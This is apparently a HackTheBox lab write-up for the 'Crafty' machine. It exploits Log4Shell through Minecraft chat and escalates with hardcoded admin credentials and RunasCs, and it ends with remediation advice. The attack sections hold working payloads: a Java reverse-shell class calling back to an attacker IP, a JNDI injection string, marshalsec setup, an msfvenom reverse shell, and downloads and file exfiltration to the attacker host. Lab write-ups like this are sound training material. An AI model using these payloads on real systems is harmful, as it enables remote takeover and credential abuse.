---
title: "HTB: Crafty - Medium Linux Box"
description: "Comprehensive walkthrough of exploiting a Minecraft server with Log4Shell (CVE-2021-44228), lateral movement through configuration files, and privilege escalation via RunasCs. Covers JNDI injection, reverse shell payloads, and Windows enumeration."
difficulty: "Medium"
platform: "HackTheBox"
category: "Windows"
tags: ["htb", "windows", "log4shell", "minecraft", "cve", "java"]
date: "2025-12-01"
featured: true
---

## Overview

Crafty is a Medium-rated Windows machine from HackTheBox that showcases the devastating Log4Shell vulnerability (CVE-2021-44228) in a real-world scenario - a Minecraft server.

**Target Information:**
* **IP:** 10.10.11.249
* **Difficulty:** Medium
* **OS:** Windows Server 2019

## Reconnaissance

### Port Scanning

Starting with comprehensive nmap scanning to identify all open ports and services:

```bash
nmap -sC -sV -oA nmap/crafty 10.10.11.249
```

**Scan Results:**
```
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Crafty - Official Website
|_http-server-header: Microsoft-IIS/10.0
25565/tcp open  minecraft Minecraft 1.16.5
```

The scan reveals two interesting services:
1. **HTTP (80)** - IIS web server hosting what appears to be a Minecraft server website
2. **Minecraft (25565)** - A Minecraft server running version 1.16.5

### Web Enumeration

Visiting the website reveals a landing page for "Crafty" - a Minecraft server community.

```bash
# Add to hosts file
echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts

# Directory enumeration
gobuster dir -u http://crafty.htb -w /usr/share/wordlists/dirb/common.txt -t 50
```

The website is mostly static with a subdomain reference to `play.crafty.htb`.

## Exploitation

### Log4Shell Vulnerability (CVE-2021-44228)

Minecraft servers running versions prior to 1.18.1 are vulnerable to Log4Shell because they use the vulnerable Log4j library for logging. The attack vector is through the chat function.

#### Setting Up the Attack

First, we need to set up our LDAP server that will serve the malicious payload:

```java
// Malicious Java class - ReverseShell.java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class ReverseShell {
    static {
        try {
            String host = "10.10.14.5";
            int port = 9001;
            String cmd = "cmd.exe";

            Process p = new ProcessBuilder(cmd)
                .redirectErrorStream(true)
                .start();

            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream();
            InputStream pe = p.getErrorStream();
            InputStream si = s.getInputStream();
            OutputStream po = p.getOutputStream();
            OutputStream so = s.getOutputStream();

            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Compile the Java class:

```bash
# Compile the malicious class
javac ReverseShell.java

# Start a Python HTTP server to serve the class
python3 -m http.server 8000
```

#### Running the LDAP Server

Using the `marshalsec` utility to create a malicious LDAP referral server:

```bash
# Clone marshalsec
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec

# Build with Maven
mvn clean package -DskipTests

# Start LDAP server pointing to our HTTP server
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
    marshalsec.jndi.LDAPRefServer \
    "http://10.10.14.5:8000/#ReverseShell"
```

#### Triggering the Vulnerability

Connect to the Minecraft server and send the JNDI payload through chat:

```bash
# Using pyCraft to connect to Minecraft
python3 -c "
from minecraft.networking.connection import Connection
from minecraft.networking.packets import Packet, clientbound, serverbound

conn = Connection('10.10.11.249', 25565, username='attacker')
conn.connect()

# Send malicious chat message
chat_packet = serverbound.play.ChatPacket()
chat_packet.message = '\${jndi:ldap://10.10.14.5:1389/ReverseShell}'
conn.write_packet(chat_packet)
"
```

Set up a listener and wait for the connection:

```bash
# Set up netcat listener
nc -lvnp 9001
```

**Shell obtained as user `svc_minecraft`!**

## Post-Exploitation

### User Flag

```bash
# Navigate to user directory
cd C:\Users\svc_minecraft\Desktop

# Read user flag
type user.txt
```

### Enumeration

Searching for interesting files and configurations:

```powershell
# Check Minecraft server directory
dir C:\Users\svc_minecraft\server

# Found interesting files
dir C:\Users\svc_minecraft\server\plugins
```

Found a plugin JAR file that might contain credentials:

```bash
# Download the plugin
nc -lvnp 4444 > plugin.jar

# On target
type C:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar > \\10.10.14.5\share\plugin.jar
```

### Extracting Credentials

Decompiling the JAR file reveals hardcoded credentials:

```java
// Decompiled from playercounter plugin
public class Playercounter implements Listener {
    private String rpiUser = "Administrator";
    private String rpiPassword = "s67u84zKq8IXw";

    // RCON connection configuration
    private String rconHost = "127.0.0.1";
    private int rconPort = 25575;
}
```

## Privilege Escalation

### Using RunasCs

Since we have Administrator credentials, we can use RunasCs to execute commands:

```powershell
# Download RunasCs
curl http://10.10.14.5:8000/RunasCs.exe -o RunasCs.exe

# Test credentials
.\RunasCs.exe Administrator s67u84zKq8IXw "whoami /all"
```

Getting a reverse shell as Administrator:

```powershell
# Generate reverse shell payload
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=9002 \
    -f exe -o shell.exe

# Execute as Administrator
.\RunasCs.exe Administrator s67u84zKq8IXw \
    "C:\Users\svc_minecraft\shell.exe"
```

### Root Flag

```powershell
# As Administrator
cd C:\Users\Administrator\Desktop
type root.txt
```

## Key Takeaways

1. **Log4Shell is devastating** - Even in gaming servers, this vulnerability allows RCE
2. **Always update dependencies** - Minecraft 1.18.1+ patched this vulnerability
3. **Don't hardcode credentials** - The plugin contained plaintext admin credentials
4. **Network segmentation** - The Minecraft server shouldn't have had access to admin functions

## Remediation

```yaml
# Recommended security measures
patching:
  - Update Minecraft to 1.18.1 or later
  - Update Log4j to 2.17.1 or later

configuration:
  - Set LOG4J_FORMAT_MSG_NO_LOOKUPS=true
  - Remove JndiLookup class from classpath

credentials:
  - Use secrets management (HashiCorp Vault, etc.)
  - Never hardcode credentials in source code
  - Implement proper service accounts with minimal permissions

network:
  - Segment gaming servers from administrative networks
  - Implement egress filtering to prevent outbound LDAP/RMI
  - Use Web Application Firewall (WAF) rules
```

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| marshalsec | LDAP referral server for JNDI injection |
| pyCraft | Minecraft protocol implementation |
| RunasCs | Windows privilege escalation |
| msfvenom | Payload generation |

## References

* [CVE-2021-44228 - Log4Shell](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
* [Minecraft Security Advisory](https://www.minecraft.net/en-us/article/important-message--security-vulnerability-java-edition)
* [RunasCs GitHub](https://github.com/antonioCoco/RunasCs)
